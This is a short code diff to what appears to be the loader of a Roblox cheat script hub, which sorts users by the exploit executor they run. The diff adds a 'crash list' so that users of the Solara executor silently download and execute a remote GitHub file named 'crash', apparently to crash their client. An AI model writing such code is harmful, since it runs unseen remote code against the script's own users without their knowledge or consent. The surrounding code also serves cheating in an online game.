@@ -25,8 +25,9 @@ Reason = ("Test") -- Reasoning as to why Majestic Hub is down
 Executor = identifyexecutor()
 
 local ExecWhiteList = {"Celery", "s"}
-local ExecBlackList = {"Solara", "s"}
+local ExecBlackList = {"s", "s"}
 local ExecNotList = {"s", "s"}
+local ExecCrashList = {"Solara", "s"}
 
 if table.find(ExecWhiteList, Executor) then
     print("Executor is Whitlisted")
@@ -35,6 +36,8 @@ elseif table.find(ExecBlackList, Executor) then
     game:GetService("Players").LocalPlayer:Kick("Executor is Blacklisted")
 elseif table.find(ExecNotList, Executor) then
     game:GetService("Players").LocalPlayer:Kick("Executor is Not suported")
+elseif table.find(ExecCrashList, Executor) then
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/CeleryHub-official/CeleryHub/main/crash')))()
 else
     print("Executor has not been tested")
     Whitelisted = false
